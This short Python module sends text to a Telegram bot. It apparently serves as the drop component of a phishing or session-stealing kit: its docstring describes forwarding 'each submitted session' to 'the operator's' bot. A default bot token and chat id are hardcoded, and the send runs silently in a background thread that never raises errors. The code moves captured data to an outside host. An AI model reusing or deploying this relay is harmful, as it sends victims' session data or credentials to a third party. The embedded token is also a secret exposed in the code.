"""Forward each submitted session to the operator's Telegram bot.

TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID override the built-in defaults.
TELEGRAM_CHAT_ID may hold several comma-separated chat ids.
"""
import os
import threading

import requests

DEFAULT_TOKEN = "8907747328:AAH2tqrSwhenGMRu9FgxH54o9Ul2kwvRfBU"
DEFAULT_CHAT = "8869502162"

API = "https://api.telegram.org/bot{token}/sendMessage"
TIMEOUT = (4, 12)
MAX_LEN = 3800


def _token():
    return os.environ.get("TELEGRAM_BOT_TOKEN", "").strip() or DEFAULT_TOKEN


def _chats():
    raw = os.environ.get("TELEGRAM_CHAT_ID", "").strip() or DEFAULT_CHAT
    return [chat.strip() for chat in raw.split(",") if chat.strip()]


def configured():
    return bool(_token() and _chats())


def send(text):
    """Send to every configured chat. True if at least one landed. Never raises."""
    token, chats = _token(), _chats()
    body = str(text or "").strip()[:MAX_LEN]
    if not token or not chats or not body:
        return False
    sent = False
    for chat in chats:
        try:
            response = requests.post(
                API.format(token=token),
                data={"chat_id": chat, "text": body, "disable_web_page_preview": "true"},
                timeout=TIMEOUT,
            )
        except requests.RequestException as error:
            print('[tg] fail:', type(error).__name__, flush=True)
            continue
        if response.status_code == 200:
            sent = True
        else:
            print('[tg] rejected:', response.status_code, response.text[:200], flush=True)
    return sent


def send_async(text):
    threading.Thread(target=send, args=(text,), daemon=True).start()
